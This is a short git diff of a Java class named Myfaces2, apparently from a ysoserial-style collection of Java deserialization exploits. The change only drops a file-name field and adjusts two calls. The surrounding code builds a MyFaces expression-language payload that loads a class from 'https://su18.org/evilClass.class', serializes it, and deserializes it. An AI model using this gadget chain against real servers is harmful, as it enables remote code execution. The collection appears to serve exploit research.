@@ -10,9 +10,6 @@ import org.su18.serialize.ysoserial.Utils.SerializeUtil;
  */
 public class Myfaces2 {
 
-	public static String fileName = "Myfaces2.bin";
-
-
 	public static String generateELs() {
 
 		String url       = "https://su18.org/evilClass.class";
@@ -33,8 +30,8 @@ public class Myfaces2 {
 
 
 	public static void main(String[] args) throws Exception {
-		SerializeUtil.writeObjectToFile(Myfaces1.generatePayload(generateELs()), fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(Myfaces1.generatePayload(generateELs()));
+		SerializeUtil.readFileObject();
 	}
 
 
